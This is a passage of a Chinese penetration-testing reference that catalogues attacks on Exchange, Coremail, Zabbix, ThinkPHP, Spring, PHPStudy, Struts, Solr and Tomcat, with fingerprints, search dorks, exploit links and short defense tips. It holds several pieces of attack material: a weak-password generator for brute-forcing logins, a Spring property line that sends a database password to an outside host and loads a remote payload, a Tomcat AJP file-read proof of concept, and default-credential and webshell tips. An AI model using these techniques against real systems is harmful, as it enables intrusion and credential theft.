rel="noopener">https://xz.aliyun.com/t/7299</a></p><p><strong>6. 漏洞利用</strong></p><p>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">https://github.com/Ridter/Exchange2domain</a></p><p>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688" target="_blank" rel="noopener">https://github.com/Ridter/cve-2020-0688</a></p><p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></p><p><strong>7. 利用技巧</strong></p><p>1.寻找企业的Exchange有个技巧</p><p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p><pre><code class="hljs css"><span class="hljs-selector-tag">mail</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">mail1</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">mail-hk</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">owa</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">exchange</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">email</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre><p>还有个很好用的域名, 这是outlook的自动发现域名</p><pre><code class="hljs css"><span class="hljs-selector-tag">autodiscover</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre><p>2.爆破Exchange</p><p>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口</p><p>通常这里的密码能横穿内网, 比如 VPN, OA, SSO</p><p><code>Exchange</code>通常有以下几个接口</p><p><code>/owa</code> 前台web登录, 一般可以爆破</p><p><code>/ews</code> 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破</p><p><code>/autodiscover/autodiscover.xml</code> 自动发现接口, 同ews爆破</p><p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p><p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p><p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p><pre><code class="hljs routeros">import itertoolsprefix = [<span class="hljs-string">'baidu'</span>, <span class="hljs-string">'Baidu'</span>]<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">''</span>.join(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list(itertools.product(prefix, [<span class="hljs-string">'@'</span>, <span class="hljs-string">''</span>], [<span class="hljs-string">'2019'</span>, <span class="hljs-string">'2020'</span>, <span class="hljs-string">'2018'</span>, <span class="hljs-string">'123'</span>, <span class="hljs-string">'1234'</span>, <span class="hljs-string">'123456'</span>], [<span class="hljs-string">'!'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'.'</span>]))] : <span class="hljs-builtin-name">print</span>(x)baidu@2019!baidu@2019baidu@2019.baidu@2020!baidu@2020<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.Baidu123456Baidu123456.</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.做好权限控制</p><h2 id="Coremail-相关漏洞"><a href="#Coremail-相关漏洞" class="headerlink" title="Coremail 相关漏洞"></a>Coremail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p><p><strong>2. 影响组件</strong><br>Coremail</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Coremail</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Coremail"</span></code></pre><p><strong>5. 漏洞分析</strong><br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p><p><strong>6. 漏洞利用</strong></p><p>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp" target="_blank" rel="noopener">https://github.com/yuxiaoyou123/coremail-exp</a></p><p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book" target="_blank" rel="noopener">https://github.com/dpu/coremail-address-book</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个找不到源码, 没法分析</p><p>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p><p>2.这个东西有几率受到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Winmail-相关漏洞"><a href="#Winmail-相关漏洞" class="headerlink" title="Winmail 相关漏洞"></a>Winmail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p><p><strong>2. 影响组件</strong><br>Winmail</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Winmail</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Winmail-Server"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html" target="_blank" rel="noopener">http://www.91ri.org/16519.html</a></p><p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm" target="_blank" rel="noopener">http://www.hackdig.com/06/hack-36899.htm</a></p><p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html" target="_blank" rel="noopener">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p><p><strong>6. 漏洞利用</strong></p><p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html" target="_blank" rel="noopener">http://www.91ri.org/16519.html</a></p><p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm" target="_blank" rel="noopener">http://www.hackdig.com/06/hack-36899.htm</a></p><p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html" target="_blank" rel="noopener">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5</p><p>2.邮件系列老洞</p><p>高屋建瓴之WebMail攻与防 – cyjay5un – 博客园<br><a href="https://www.cnblogs.com/cyjaysun/p/4378907.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4378907.html</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Zabbix-相关漏洞"><a href="#Zabbix-相关漏洞" class="headerlink" title="Zabbix 相关漏洞"></a>Zabbix 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行</p><p><strong>2. 影响组件</strong></p><p>Zabbix</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Zabbix</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Zabbix"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a></p><p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p><p><strong>6. 漏洞利用</strong></p><p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a></p><p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p><p><strong>7. 利用技巧</strong></p><p>1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了</p><p>2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="边界产品-防火墙-网关-路由器-VPN-相关漏洞"><a href="#边界产品-防火墙-网关-路由器-VPN-相关漏洞" class="headerlink" title="边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞"></a>边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p><p><strong>2. 影响组件</strong></p><p>防火墙, 网关, 路由器, VPN</p><p><strong>3. 漏洞指纹</strong></p><p>防火墙, 网关, 路由器, VPN</p><p><strong>4. Fofa Dork</strong><br>防火墙, 网关, 路由器, VPN 的名称</p><p><strong>5. 漏洞分析</strong></p><p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html" target="_blank" rel="noopener">https://www.it2021.com/security/614.html</a></p><p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p><p><strong>6. 漏洞利用</strong></p><p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html" target="_blank" rel="noopener">https://www.it2021.com/security/614.html</a></p><p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令</p><p><code>admin</code> <code>root</code> <code>123456</code> 永远的神</p><p>内网的安全平台就是个漏洞指南</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.限制来源IP</p><h1 id="第三节"><a href="#第三节" class="headerlink" title="第三节"></a>第三节</h1><h2 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p><p><strong>2. 影响组件</strong><br>Thinkphp</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs sas">Thinkphp<span class="hljs-meta">X</span>-Powered-<span class="hljs-meta">By</span>: ThinkPHP</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"ThinkPHP"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165" target="_blank" rel="noopener">http://zone.secevery.com/article/1165</a></p><p>挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心<br><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p><p>ThinkPHP使用不当可能造成敏感信息泄露<em>PHP_Fly</em>鹏程万里-CSDN博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/81201904" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p><p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203461</a></p><p><strong>6. 漏洞利用</strong></p><p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp" target="_blank" rel="noopener">https://github.com/Dido1960/thinkphp</a></p><p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack" target="_blank" rel="noopener">https://github.com/whirlwind110/tphack</a></p><p><strong>7. 利用技巧</strong></p><p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p><p>2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p><p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞</p><p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203461</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版Thinkphp</p><p>3.前置WAF进行防护</p><h2 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p><p><strong>2. 影响组件</strong><br>Spring xxx</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs coq">X-Application-<span class="hljs-keyword">Context</span>:</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Spring-Framework"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Spring 框架漏洞集合 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/04/Spring-框架漏洞集合/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p><p>Exploiting Spring Boot Actuators | Veracode blog<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p><p>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog<br>[<a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]" target="_blank" rel="noopener">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]</a>(<a href="https://jianfensec.com/漏洞复现/Spring" target="_blank" rel="noopener">https://jianfensec.com/漏洞复现/Spring</a> Boot Actuators配置不当导致RCE漏洞复现/)</p><p><strong>6. 漏洞利用</strong></p><p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit" target="_blank" rel="noopener">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p><p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><p><strong>7. 利用技巧</strong></p><p>1.Spring Boot Actuators 相关漏洞超级好用</p><p>很多厂商一开始都不懂, 直接对外开放<code>Spring Boot Actuators</code>, 造成了有一段时间每个用了<code>Spring Boot</code>的厂商都出了问题</p><p>尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个<code>Spring Boot</code>启动的服务</p><p>然后子目录比如 <code>http://123.123.123.123/admin/env</code> , <code>http://123.123.123.123/manager/env</code>也都是可以出现的</p><p><code>/env</code> 可以偷session, RCE</p><p><code>/heapdump</code> 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象</p><p>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p><pre><code class="hljs jboss-cli"><span class="hljs-string">/trace</span><span class="hljs-string">/health</span><span class="hljs-string">/loggers</span><span class="hljs-string">/metrics</span><span class="hljs-string">/autoconfig</span><span class="hljs-string">/heapdump</span><span class="hljs-string">/threaddump</span><span class="hljs-string">/env</span><span class="hljs-string">/info</span><span class="hljs-string">/dump</span><span class="hljs-string">/configprops</span><span class="hljs-string">/mappings</span><span class="hljs-string">/auditevents</span><span class="hljs-string">/beans</span><span class="hljs-string">/jolokia</span><span class="hljs-string">/cloudfoundryapplication</span><span class="hljs-string">/hystrix.stream</span><span class="hljs-string">/actuator</span><span class="hljs-string">/actuator/auditevents</span><span class="hljs-string">/actuator/beans</span><span class="hljs-string">/actuator/health</span><span class="hljs-string">/actuator/conditions</span><span class="hljs-string">/actuator/configprops</span><span class="hljs-string">/actuator/env</span><span class="hljs-string">/actuator/info</span><span class="hljs-string">/actuator/loggers</span><span class="hljs-string">/actuator/heapdump</span><span class="hljs-string">/actuator/threaddump</span><span class="hljs-string">/actuator/metrics</span><span class="hljs-string">/actuator/scheduledtasks</span><span class="hljs-string">/actuator/httptrace</span><span class="hljs-string">/actuator/mappings</span><span class="hljs-string">/actuator/jolokia</span><span class="hljs-string">/actuator/hystrix.stream</span><span class="hljs-string">/monitor</span><span class="hljs-string">/monitor/auditevents</span><span class="hljs-string">/monitor/beans</span><span class="hljs-string">/monitor/health</span><span class="hljs-string">/monitor/conditions</span><span class="hljs-string">/monitor/configprops</span><span class="hljs-string">/monitor/env</span><span class="hljs-string">/monitor/info</span><span class="hljs-string">/monitor/loggers</span><span class="hljs-string">/monitor/heapdump</span><span class="hljs-string">/monitor/threaddump</span><span class="hljs-string">/monitor/metrics</span><span class="hljs-string">/monitor/scheduledtasks</span><span class="hljs-string">/monitor/httptrace</span><span class="hljs-string">/monitor/mappings</span><span class="hljs-string">/monitor/jolokia</span><span class="hljs-string">/monitor/hystrix.stream</span></code></pre><p>这里通过 <code>/env</code> + <code>/refresh</code> 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作</p><p>里面就有操作空间, 很像fastjson反序列化</p><p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok</p><pre><code class="hljs roboconf">eureka.client.serviceUrl.defaultZone=http://${<span class="hljs-attribute">somedb.password}@127.0.0.1</span>:5000spring<span class="hljs-variable">.cloud</span><span class="hljs-variable">.bootstrap</span><span class="hljs-variable">.location</span>=http://${somedb<span class="hljs-variable">.password</span>}@artsploit<span class="hljs-variable">.com</span>/yaml-payload<span class="hljs-variable">.yml</span></code></pre><p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群</p><p>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.开启Spring Boot Actuators权限校验</p><p>3.前置WAF进行防护</p><h2 id="Phpstudy-后门远程代码执行"><a href="#Phpstudy-后门远程代码执行" class="headerlink" title="Phpstudy 后门远程代码执行"></a>Phpstudy 后门远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器</p><p><strong>2. 影响组件</strong></p><p>Phpstudy</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs nginx"><span class="hljs-attribute">phpStudy</span> 探针</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"phpStudy 探针"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/" target="_blank" rel="noopener">https://paper.seebug.org/1044/</a></p><p><strong>6. 漏洞利用</strong></p><p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p><p><strong>7. 利用技巧</strong></p><p>1.phpstudy 根目录下面有个<code>l.php</code> , 里面有探针, 可以作为判断条件</p><p>2.还有个<code>/phpmyadmin</code>目录, 一般密码都是<code>root/root</code> 后台<code>mysql outfile</code> 写 shell 就ok了</p><p><strong>8. 防护方法</strong></p><p>1.及时删除phpstudy</p><p>2.升级到最新版</p><p>3.不要用phpstduy搭建生产环境</p><h2 id="Struts-系列漏洞"><a href="#Struts-系列漏洞" class="headerlink" title="Struts 系列漏洞"></a>Struts 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p><p><strong>2. 影响组件</strong><br>Struts</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs asciidoc">Struts<span class="hljs-title">.action</span><span class="hljs-title">.do</span><span class="hljs-title">.action!xxxx</span></code></pre><p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/" target="_blank" rel="noopener">https://github.com/coffeehb/struts2_check/</a></p><p><strong>4. Fofa Dork</strong></p><p><code>app="Struts2"</code> (这个不太准)</p><p><strong>5. 漏洞分析</strong></p><p>Struts2代码执行漏洞整理 – 简书<br><a href="https://www.jianshu.com/p/d7cd8a2a992b" target="_blank" rel="noopener">https://www.jianshu.com/p/d7cd8a2a992b</a></p><p><strong>6. 漏洞利用</strong></p><p>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan</p><p><a href="https://github.com/Lucifer1993/struts-scan/" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan/</a></p><p><strong>7. 利用技巧</strong></p><p>1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.不建议使用Struts</p><h2 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p><p><strong>2. 影响组件</strong></p><p>Solr</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Solr</span></code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Solr"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a></p><p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<br><a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a></p><p><strong>6. 漏洞利用</strong></p><p>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection</a></p><p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12409</a></p><p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet" target="_blank" rel="noopener">https://github.com/mogwailabs/mjet</a></p><p><strong>7. 利用技巧</strong></p><p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p><p>2.遇到<code>mjet</code>连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用<code>socat</code>进行流量转发, 后记里面有具体操作</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.不要对外开放敏感端口</p><h2 id="Tomcat-本地文件包含漏洞-CVE-2020-1938"><a href="#Tomcat-本地文件包含漏洞-CVE-2020-1938" class="headerlink" title="Tomcat 本地文件包含漏洞 (CVE-2020-1938)"></a>Tomcat 本地文件包含漏洞 (CVE-2020-1938)</h2><p><strong>1. 漏洞简介</strong></p><p>Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效</p><p><strong>2. 影响组件</strong></p><p>Apache Tomcat 6</p><p>Apache Tomcat 7 &lt; 7.0.100</p><p>Apache Tomcat 8 &lt; 8.5.51</p><p>Apache Tomcat 9 &lt; 9.0.31</p><p><strong>3. 漏洞指纹</strong></p><pre><code class="hljs taggerscript">tomcat8009ajp<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>15</code></pre><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">protocol</span>=<span class="hljs-string">"ajp"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp协议文件包含漏洞分析/" target="_blank" rel="noopener">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p><p><strong>6. 漏洞利用</strong></p><p>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p><p><strong>7. 利用技巧</strong></p><p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p><p>主要代码也就这</p><pre><code class="hljs stylus">t = Tomcat(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">8009</span>)_, data = t.perform_request(<span class="hljs-string">'/'</span>, attributes=[    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.request_uri'</span>, <span class="hljs-string">'/'</span>]},     {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.path_info'</span>, <span class="hljs-string">"/WEB-INF/web.xml"</span>]},     {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.servlet_path'</span>, <span class="hljs-string">'/'</span>]}, ])<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'----------------------------'</span>)</span></span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">""</span>.join([bytes.decode(d.data)</span></span> <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))</code></pre><p>2.通过修改这里的路径可以进行Webapp切换, 默认是<code>ROOT/</code>, 需要切换应用就改成 <code>/admin/</code> 之类的</p><p>3.通常检测的时候, 尽量保持<code>t.perform_request('/'</code> , 有的poc喜欢用 <code>/addsd</code> 这种的不存在的路径, 有些情况会读不到文件</p><p><strong>8. 